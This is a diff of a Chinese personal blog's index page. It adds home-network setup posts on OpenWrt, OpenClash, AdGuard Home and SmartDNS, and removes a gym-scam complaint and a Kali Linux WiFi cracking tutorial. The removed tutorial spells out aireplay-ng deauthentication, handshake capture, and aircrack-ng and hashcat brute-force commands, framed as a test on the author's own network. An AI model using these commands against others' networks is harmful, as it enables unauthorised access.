@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 4.2.0">
+<meta name="generator" content="Hexo 4.2.1">
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
   <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
   <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
@@ -156,6 +156,204 @@
             
 
   <div class="posts-expand">
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://kulove.cc/2021/12/02/%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92%EF%BC%9A%E4%BA%8C%E3%80%81OpenWrt-OpenClash%E3%80%81AdGuard-Home%E3%80%81SmartDNS/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Louis Yang">
+      <meta itemprop="description" content="程序猿一枚，偶尔写写故事、搞搞安全。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Louis Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/12/02/%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92%EF%BC%9A%E4%BA%8C%E3%80%81OpenWrt-OpenClash%E3%80%81AdGuard-Home%E3%80%81SmartDNS/" class="post-title-link" itemprop="url">家庭网络改造计划：二、OpenWrt(OpenClash、AdGuard Home、SmartDNS)</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-12-02 15:11:33" itemprop="dateCreated datePublished" datetime="2021-12-02T15:11:33+08:00">2021-12-02</time>
+            </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/2021/12/02/%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92%EF%BC%9A%E4%BA%8C%E3%80%81OpenWrt-OpenClash%E3%80%81AdGuard-Home%E3%80%81SmartDNS/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2021/12/02/家庭网络改造计划：二、OpenWrt-OpenClash、AdGuard-Home、SmartDNS/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <blockquote>
+<p>在上篇文章里，大概说了下我的需求以及相关软硬件的选型，本篇会记录一些OpenWrt下常用的软件，以及相互搭配下要如何配置。</p>
+</blockquote>
+<h3 id="零、OpenClash-VS-PassWall-怎么选？"><a href="#零、OpenClash-VS-PassWall-怎么选？" class="headerlink" title="零、OpenClash VS PassWall 怎么选？"></a>零、OpenClash VS PassWall 怎么选？</h3><p>首先，在我目前的硬件以及网络带宽中，两者其实差别并不大，无非是在配置上略有不同罢了。</p>
+<p>比如PassWall使用配置简单，在低配路由上也能很好的发挥出性能；OpenClash虽然占用比较多的资源但也拥有更多的功能：比如高级策略分流等等。</p>
+<p>反正我也不怕折腾，后续就选用了OpenClash。</p>
+<h3 id="一、SmartDNS有无必要？"><a href="#一、SmartDNS有无必要？" class="headerlink" title="一、SmartDNS有无必要？"></a>一、SmartDNS有无必要？</h3><p>你可能会问既然AdGuard Home也有DNS解析功能，那和SmartDNS不是冲突了么？为什么还要多此一举呢？答案并不是。</p>
+<p>这里有个很关键的问题：AdGuard Home的DNS解析是无法区分域名该使用哪个DNS服务器解析的，而一般我们会配置多个DNS服务器，以返回最快的结果为准。</p>
+<p><img src="/2021/12/02/%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92%EF%BC%9A%E4%BA%8C%E3%80%81OpenWrt-OpenClash%E3%80%81AdGuard-Home%E3%80%81SmartDNS/Untitled.png" alt="Untitled"></p>
+<p>这里问题就来了，以国内运营商的尿性，你也不知道啥时候会被DNS投毒不是，所以我们这里要用SmartDNS来对域名做个分流。</p>
+<h3 id="二、OpenClash如何搭配AdGuard-Home以及SmartDNS？"><a href="#二、OpenClash如何搭配AdGuard-Home以及SmartDNS？" class="headerlink" title="二、OpenClash如何搭配AdGuard Home以及SmartDNS？"></a>二、OpenClash如何搭配AdGuard Home以及SmartDNS？</h3><p>OK，我们先看下规划图：</p>
+<p><img src="/2021/12/02/%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92%EF%BC%9A%E4%BA%8C%E3%80%81OpenWrt-OpenClash%E3%80%81AdGuard-Home%E3%80%81SmartDNS/Untitled%201.png" alt="Untitled"></p>
+<ol>
+<li><p>首先我们要在SmartDNS配置好DNS服务器并进行分组：</p>
+<p><img src="/2021/12/02/%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92%EF%BC%9A%E4%BA%8C%E3%80%81OpenWrt-OpenClash%E3%80%81AdGuard-Home%E3%80%81SmartDNS/Untitled%202.png" alt="Untitled"></p>
+</li>
+<li><p>自定义设置里分别为不同组绑定端口：</p>
+</li>
+</ol>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bind :<span class="number">6666</span> -group cn</span><br><span class="line">bind :<span class="number">7777</span> -group us</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/12/02/%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92%EF%BC%9A%E4%BA%8C%E3%80%81OpenWrt-OpenClash%E3%80%81AdGuard-Home%E3%80%81SmartDNS/Untitled%203.png" alt="Untitled"></p>
+<ol>
+<li>然后在AdGuard Home的DNS设置分别设置上游DNS服务器以及Bootstrap DNS服务器：</li>
+</ol>
+<p><img src="/2021/12/02/%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92%EF%BC%9A%E4%BA%8C%E3%80%81OpenWrt-OpenClash%E3%80%81AdGuard-Home%E3%80%81SmartDNS/Untitled%204.png" alt="Untitled"></p>
+<ol>
+<li>OpenClash DNS设置配置如下：</li>
+</ol>
+<p><img src="/2021/12/02/%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92%EF%BC%9A%E4%BA%8C%E3%80%81OpenWrt-OpenClash%E3%80%81AdGuard-Home%E3%80%81SmartDNS/Untitled%205.png" alt="Untitled"></p>
+<p>至此，已经完成了科学上网的全部步骤，可以尽情享受网上冲浪的乐趣了。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://kulove.cc/2021/11/26/%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92%EF%BC%9A%E4%B8%80%E3%80%81%E8%AE%A1%E5%88%92-PVE%E3%80%81OpenWrt%E3%80%81Docker/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Louis Yang">
+      <meta itemprop="description" content="程序猿一枚，偶尔写写故事、搞搞安全。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Louis Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/11/26/%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92%EF%BC%9A%E4%B8%80%E3%80%81%E8%AE%A1%E5%88%92-PVE%E3%80%81OpenWrt%E3%80%81Docker/" class="post-title-link" itemprop="url">家庭网络改造计划：一、计划(PVE、OpenWrt、Docker)</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-11-26 11:57:26" itemprop="dateCreated datePublished" datetime="2021-11-26T11:57:26+08:00">2021-11-26</time>
+            </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/2021/11/26/%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92%EF%BC%9A%E4%B8%80%E3%80%81%E8%AE%A1%E5%88%92-PVE%E3%80%81OpenWrt%E3%80%81Docker/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2021/11/26/家庭网络改造计划：一、计划-PVE、OpenWrt、Docker/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <blockquote>
+<p>早就有改造网络环境的计划，奈何之前都是和朋友合租，并不方便做这些。最近搬了新房子，终于得以实施这次改造。</p>
+</blockquote>
+<h3 id="零、需求"><a href="#零、需求" class="headerlink" title="零、需求"></a>零、需求</h3><p>OK，首先说一下这次网络改造的需求：</p>
+<ol>
+<li>科学上网：每个设备都要安装软件实在是太麻烦了！更何况一些硬件比如Oculus Quest、Switch必须要求“网络通畅”，全局无疑是最好的选择；</li>
+<li>广告过滤/隐私保护：路由器层面的方案一般是DNS过滤，有优有劣，聊胜于无；</li>
+<li>Docker：主要是部署一些自己写的小玩意儿，比如一些网站的定时签到脚本等等；</li>
+<li>NAS：鉴于现在的网盘动不动就限速或者直接屏蔽文件(这是最恶心的，起码让下载回来啊)，那么本地存储是必不可少的，另外就是最近经历过几次SSD掉盘，所以组个RAID也必不可少；</li>
+<li>异地组网：由于没有公网IP，我这里选择的是腾讯云+frp+ZeroTier/Tailscale的组合。</li>
+</ol>
+<h3 id="一、硬件"><a href="#一、硬件" class="headerlink" title="一、硬件"></a>一、硬件</h3><p>欲先利其事必先利其器，硬件的选择是改造的重点：</p>
+<ol>
+<li>路由：AP这块选择的是小米的AX6000，性价比很高，另外这款路由器升级了2.5G网口，这对局域网内NAS的传输速度是很关键的；</li>
+<li>软路由：这里我选择的是J4125/16GB/128GB组合，目前来说性能过剩，但性价比还不错；</li>
+<li>NAS：在群晖 DS920+和威联通 TS- 453Dmini之间纠结很久：群晖用户体验好、但威联通性价比高；综合考虑，最后还是选了威联通，暂时配了14TB * 2的硬盘组RAID1。</li>
+</ol>
+<h3 id="二、软件"><a href="#二、软件" class="headerlink" title="二、软件"></a>二、软件</h3><ol>
+<li>虚拟系统：目前主流的大概是：ESXi、unRaid以及PVE，三者我都用了下，最后选择了PVE。</li>
+<li>软路由：这块主流就是OpenWrt，我选择的是Lean定制版。</li>
+<li>iKuai：原本是在规划里面，后面发现对我而言并没有什么作用，并没有多拨、流控之类的需求，后面也就舍弃了。</li>
+</ol>
+<p>最后，附上这次改造后的网络拓补图：</p>
+<p><img src="/2021/11/26/%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92%EF%BC%9A%E4%B8%80%E3%80%81%E8%AE%A1%E5%88%92-PVE%E3%80%81OpenWrt%E3%80%81Docker/network.jpeg" alt></p>
+<p>当然，这几篇改造计划并不会涉及到软件安装配置等基本操作，仅仅起到记录作用。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
         
   
   
@@ -875,250 +1073,6 @@
   
   
 
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://kulove.cc/2018/10/22/Kali-Linux-%E9%AB%98%E6%95%88%E7%A0%B4%E8%A7%A3Wifi%E5%AF%86%E7%A0%81/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Louis Yang">
-      <meta itemprop="description" content="程序猿一枚，偶尔写写故事、搞搞安全。">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Louis Blog">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2018/10/22/Kali-Linux-%E9%AB%98%E6%95%88%E7%A0%B4%E8%A7%A3Wifi%E5%AF%86%E7%A0%81/" class="post-title-link" itemprop="url">Kali Linux 高效破解Wifi密码</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2018-10-22 18:02:30" itemprop="dateCreated datePublished" datetime="2018-10-22T18:02:30+08:00">2018-10-22</time>
-            </span>
-
-          
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="fa fa-comment-o"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/2018/10/22/Kali-Linux-%E9%AB%98%E6%95%88%E7%A0%B4%E8%A7%A3Wifi%E5%AF%86%E7%A0%81/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2018/10/22/Kali-Linux-高效破解Wifi密码/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <blockquote>
-<p>起因是最近买了个Wifi Pineapple，感觉无线安全挺有意思，再加上网上破解Wifi的教程要么跑不起来、要么不是很详细，所以就准备写这篇文章。</p>
-</blockquote>
-<h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><blockquote>
-<p>1.支持监听模式的无线网卡，我这里是小米的无线网卡</p>
-<p>2.Kali Linux，我这里是VMware虚拟机</p>
-</blockquote>
-<ol>
-<li><p>挂载网卡</p>
-<p><img src="/2018/10/22/Kali-Linux-%E9%AB%98%E6%95%88%E7%A0%B4%E8%A7%A3Wifi%E5%AF%86%E7%A0%81/0.png" alt="pic"></p>
-</li>
-<li><p>下载密码字典</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -L -o rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt</span><br><span class="line"><span class="meta">#</span><span class="bash"> 比较常用的密码字典，不是很大，国内Wifi成功率不会很高</span></span><br></pre></td></tr></table></figure>
-
-
-</li>
-</ol>
-<h2 id="开始破解"><a href="#开始破解" class="headerlink" title="开始破解"></a>开始破解</h2><ol>
-<li><p>检查网卡是否支持监听</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng</span><br><span class="line"><span class="meta">#</span><span class="bash"> 出现为wlan0的网卡则支持</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>开启</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng start wlan0</span><br><span class="line"><span class="meta">#</span><span class="bash"> 开启后名称变成了wlan0mon</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>搜索附近的网络</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng wlan0mon</span><br><span class="line"><span class="meta">#</span><span class="bash"> 这里使用自己的Wifi作为对象，私自破解他人Wifi属于违法行为</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2018/10/22/Kali-Linux-%E9%AB%98%E6%95%88%E7%A0%B4%E8%A7%A3Wifi%E5%AF%86%E7%A0%81/1.png" alt="pic"></p>
-</li>
-<li><p>抓取握手包</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng -c 11 --bssid 74:7D:24:77:2B:6F -w ~/ wlan0mon</span><br><span class="line"><span class="meta">#</span><span class="bash"> -c 为信道，这里主要是需要包含密码信息的数据包</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2018/10/22/Kali-Linux-%E9%AB%98%E6%95%88%E7%A0%B4%E8%A7%A3Wifi%E5%AF%86%E7%A0%81/2.png" alt="pic"></p>
-</li>
-<li><p>攻击，使目标设备断开重新连接，以便获取握手包</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aireplay-ng -0 2 -a 74:7D:24:77:2B:6F -c 84:89:AD:6F:60:6F wlan0mon</span><br><span class="line"><span class="meta">#</span><span class="bash"> -a Wifi热点的BSSID -c 攻击设备的MAC地址</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2018/10/22/Kali-Linux-%E9%AB%98%E6%95%88%E7%A0%B4%E8%A7%A3Wifi%E5%AF%86%E7%A0%81/3.png" alt="pic"></p>
-</li>
-<li><p>耐心等待设备重新连接以抓取认证数据包</p>
-<p><img src="/2018/10/22/Kali-Linux-%E9%AB%98%E6%95%88%E7%A0%B4%E8%A7%A3Wifi%E5%AF%86%E7%A0%81/4.png" alt="pic"></p>
-<blockquote>
-<p>成功后可终止命令。</p>
-<p><img src="/2018/10/22/Kali-Linux-%E9%AB%98%E6%95%88%E7%A0%B4%E8%A7%A3Wifi%E5%AF%86%E7%A0%81/5.png" alt="pic"></p>
-</blockquote>
-</li>
-<li><p>暴力破解</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng -a2 -b 74:7D:24:77:2B:6F -w rockyou.txt ~/*.cap</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2018/10/22/Kali-Linux-%E9%AB%98%E6%95%88%E7%A0%B4%E8%A7%A3Wifi%E5%AF%86%E7%A0%81/6.png" alt="pic"></p>
-<blockquote>
-<p>这里已经破解成功了，由于自己的密码并不是很复杂，所以很快就完成了破解，实际使用中使用这个密码字典成功率不会很高，需要使用更大的字典才行。</p>
-<p>但更大的字典意味着破解速度会被无限拉长。。</p>
-<p>所以下面使用Hashcat来破解密码，实际测试下来，速度确实快了几倍。</p>
-</blockquote>
-</li>
-</ol>
-<h2 id="使用Hashcat破解"><a href="#使用Hashcat破解" class="headerlink" title="使用Hashcat破解"></a>使用Hashcat破解</h2><blockquote>
-<p>官方介绍是：Hashcat是当前速度最快、最先进的开源密码恢复工具。</p>
-<p>我这边测试的是使用GPU破解，所以将环境转移到了Windows下。</p>
-</blockquote>
-<ol>
-<li><p>格式转换</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> https://github.com/hashcat/hashcat-utils/releases</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 下载转换工具，将<span class="built_in">cap</span>文件转换为hccapx文件</span></span><br><span class="line"> ./cap2hccapx.exe -01.cap 01.hccapx</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2018/10/22/Kali-Linux-%E9%AB%98%E6%95%88%E7%A0%B4%E8%A7%A3Wifi%E5%AF%86%E7%A0%81/7.png" alt="pic"></p>
-</li>
-<li><p>使用密码字典破解</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> https://github.com/hashcat/hashcat/releases</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 下载 Hashcat，开始破解</span></span><br><span class="line"> .\hashcat64.exe -m 2500 01.hccapx .\rockyou.txt</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2018/10/22/Kali-Linux-%E9%AB%98%E6%95%88%E7%A0%B4%E8%A7%A3Wifi%E5%AF%86%E7%A0%81/8.png" alt="pic"></p>
-<blockquote>
-<p>完成，速度超快！</p>
-</blockquote>
-</li>
-<li><p>使用掩码破解</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 知道密码长度使用此模式还行，如果不知道。。</span></span><br><span class="line">.\hashcat64.exe -m 2500 -a 3 01.hccapx -1 ?l?d ?1?1?1?1?1?1?1?1?1?1?1</span><br><span class="line">1 ?l?u ?1?1?1?1?1?1?1?1</span><br><span class="line"><span class="meta">#</span><span class="bash"> 指定11位</span></span><br><span class="line">.\hashcat64.exe -m 2500 -a 3 01.hccapx --increment --increment-min=8 --increment-max=15 -1 ?a ?1?1?1?1?1?1?1?1?1?1?1?1?1?1</span><br><span class="line"><span class="meta">#</span><span class="bash"> 从8位破解到15位,超高难度</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 显卡不行，所以就不测试该模式的时间了</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>常见问题</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">* Device #1: WARNING! Kernel exec timeout is not disabled.</span><br><span class="line">             This may cause &quot;CL_OUT_OF_RESOURCES&quot; or related errors.</span><br><span class="line">             To disable the timeout, see: https:&#x2F;&#x2F;hashcat.net&#x2F;q&#x2F;timeoutpatch</span><br><span class="line">           </span><br><span class="line"># 参考 https:&#x2F;&#x2F;hashcat.net&#x2F;q&#x2F;timeoutpatch 新建 wddm_timeout_patch.reg 文件，内容如下，保存后双击运行导入注册表。</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"></span><br><span class="line">[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\GraphicsDrivers]</span><br><span class="line">&quot;TdrLevel&quot;&#x3D;dword:00000000</span><br></pre></td></tr></table></figure>
-</li>
-</ol>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://kulove.cc/2018/10/11/%E4%B8%80%E5%85%86%E9%9F%A6%E5%BE%B7%E7%9A%84%E6%97%A0%E8%80%BB%E5%A5%97%E8%B7%AF/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Louis Yang">
-      <meta itemprop="description" content="程序猿一枚，偶尔写写故事、搞搞安全。">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Louis Blog">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2018/10/11/%E4%B8%80%E5%85%86%E9%9F%A6%E5%BE%B7%E7%9A%84%E6%97%A0%E8%80%BB%E5%A5%97%E8%B7%AF/" class="post-title-link" itemprop="url">一兆韦德的无耻套路</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2018-10-11 10:28:24" itemprop="dateCreated datePublished" datetime="2018-10-11T10:28:24+08:00">2018-10-11</time>
-            </span>
-
-          
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="fa fa-comment-o"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/2018/10/11/%E4%B8%80%E5%85%86%E9%9F%A6%E5%BE%B7%E7%9A%84%E6%97%A0%E8%80%BB%E5%A5%97%E8%B7%AF/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2018/10/11/一兆韦德的无耻套路/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>国庆过后，又胖了一圈。。同时感觉自己身体不太好，就想着办张健身卡。</p>
-<p>因为种种原因所以选择在二手平台上看转卡信息，结果无一例外都是人外出，委托给健身房，让自己去办理之类的。</p>
-<p>然后就网上查了下，发现这些全是套路，到了之后会以转让费或者人不在之类的做借口忽悠你办店里的套餐。如果你坚持办，ok，没问题，他们会在一段时间后把卡停掉，然后以公司卡违规之类的来让你升级卡片。</p>
-<p>套路多多，逐放弃转卡这一渠道，然后无意中看到全新卡，价格在转卡和门店价格之间，然后直接去办理就好，就放松了警惕，约好下班之后去办理。</p>
-<p><img src="/2018/10/11/%E4%B8%80%E5%85%86%E9%9F%A6%E5%BE%B7%E7%9A%84%E6%97%A0%E8%80%BB%E5%A5%97%E8%B7%AF/1.jpg" alt></p>
-<p>到达门店之后，确认价格、时间等，这时候套路来了，它会拿来入会表格让你填，然后告诉你一些无关紧要的问题，比如无法转卡、无法停卡之类的小问题，让你放松警惕。</p>
-<p>表示这些没问题以后，会让你付款，付完款之后，会让店里的经理给你讲一些其他的问题，这时候经理就会说这个卡是公司卡，然后无法补卡，公司可以随时中止之类的条款。</p>
-<p>这个时候正常人肯定会想，这些事先没给说啊，没有知情权，那我不办了可以吧？可是事情并没有那么简单，然后两个人就开始双簧了，工作人员说这个不是我们的，是它们公司的，所以要去找它们。然后卖卡的人又会说已经报到公司去了，不能退。而且经理态度恶劣，说随便你用什么手段解决（录音可以听到）。</p>
-<p>这时候问题来了，POS机刷卡信息显示的是健身房，说是别的公司？会让一个不相干的拿来POS机？后来证明这个所谓公司的人其实就是店里的。</p>
-<p><img src="/2018/10/11/%E4%B8%80%E5%85%86%E9%9F%A6%E5%BE%B7%E7%9A%84%E6%97%A0%E8%80%BB%E5%A5%97%E8%B7%AF/2.jpg" alt></p>
-<p>这个时候如果你态度强硬，表示会曝光并且去投诉的话，它就会服软说可以退，但是要几个月的时间，并且需要再次来店里确认退款手续。但是，这个时候主动权已经完全不在你手中了，既然说退款，那么有关部门也未必会管，而且具体多久就完全不能预计了。</p>
-<p>这里肯定会有人洗地了，什么价格很明显不合理啊、想占便宜活该被骗啊、谁叫你事先没问明白之类的，呵呵送给你。</p>
-<p>这个时候所谓经理就开始推销套餐，说可以把这个钱转过去，转成正式套餐，只需要付款剩下的部分，最终的结果就是花了近三倍的价格办了几年卡。。</p>
-<p>{ <a href="http://p20g9o3r4.bkt.clouddn.com/1.mp3}" target="_blank" rel="noopener">http://p20g9o3r4.bkt.clouddn.com/1.mp3}</a></p>
-<p>说到最后这张卡，我是不准备退的，写出来主要是防止更多的人上当受骗。还有就是态度问题：办卡的时候你是爷，办了卡之后它是爷，简直一百八十度转弯。没错，约定好的承诺没完全兑现，一直拖着。</p>
-<p>除此之外还有几点：第一点是不知道以这种近乎胁迫的形式签的合同有没有效？第二是也没有那么多的精力来搞维权，相信它们手段肯定还是有一套的；第三就是我确实也需要一张健身卡，只是手段令人十分不齿罢了。</p>
-<p>写的有点乱，本以为小心翼翼，结果套路防不胜防。避免一些不必要的麻烦，所以图片和录音都是经过处理的 。如果能让无良商家收敛一点也是极好的。</p>
-<p>最后，这些无良商家真的就没人出来管管？？</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
   </div>
 
   
@@ -1189,7 +1143,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">22</span>
+          <span class="site-state-item-count">24</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -1232,13 +1186,13 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2020</span>
+  <span itemprop="copyrightYear">2021</span>
